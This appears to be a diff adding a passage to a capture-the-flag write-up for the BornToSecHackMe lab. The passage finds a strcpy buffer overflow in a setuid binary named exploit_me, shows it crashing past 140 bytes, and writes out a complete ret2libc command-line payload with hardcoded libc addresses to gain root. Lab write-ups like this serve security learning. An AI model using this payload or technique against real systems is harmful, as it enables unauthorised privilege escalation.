@@ -583,9 +583,20 @@ exploit_me  mail
 
 
 
+Upon disassembling the binary exploit_me, there is a call to strcpy().
+The program segfaults if we provide more than 140 characters to print.
 
+```
+zaz@BornToSecHackMe:~$ ./exploit_me `python -c "print 'A' * 141"`
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+Segmentation fault (core dumped)
+```
 
+Let's use a ret2libc in order to get root access.
 
+1) Get system address 
+
+./exploit_me `python -c "print 'A' * 140 + '\x60\xb0\xe6\xb7' + '\xe0\xeb\xe5\xb7' + '\x58\xcc\xf8\xb7'"`
 
 
 
